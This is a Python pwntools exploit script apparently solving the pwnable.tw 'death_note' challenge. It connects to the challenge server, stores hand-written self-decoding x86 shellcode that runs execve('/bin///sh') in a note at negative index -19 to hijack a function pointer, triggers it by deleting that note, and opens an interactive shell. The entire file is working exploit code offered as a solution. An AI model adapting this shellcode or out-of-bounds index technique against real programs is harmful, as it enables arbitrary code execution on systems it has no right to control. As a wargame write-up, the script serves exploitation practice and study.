#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
 cn = process('./death_note')
else:
 cn = remote('chall.pwnable.tw', 10201)


def z(a=''):
 gdb.attach(cn,a)
 if a == '':
  raw_input()


def add(idx,con):
 cn.sendline('1')
 cn.recvuntil('Index :')
 cn.sendline(str(idx))
 cn.recvuntil('Name :')
 cn.sendline(con)

def dele(idx):
 cn.sendline('3')
 cn.recvuntil('Index :')
 cn.sendline(str(idx))

#gdb.attach(cn)
pay = asm('''
/* execve('/bin///sh',0,0)*/

push 0x68
push 0x732f2f2f
push 0x6e69622f

push esp
pop ebx /*set ebx to '/bin///sh'*/


push edx
dec edx
dec edx /*set dl to 0xfe*/


xor [eax+32],dl /*decode int 0x80*/
xor [eax+33],dl /*decode int 0x80*/

inc edx
inc edx /*recover edx to 0*/

push edx
pop ecx /*set ecx to 0*/

push 0x40
pop eax
xor al,0x4b /*set eax to 0xb*/

/*int 0x80*/
''')+'\x33\x7e'

add(-19,pay)
#z('b*0x08048490\nc')
dele(-19)

cn.interactive()
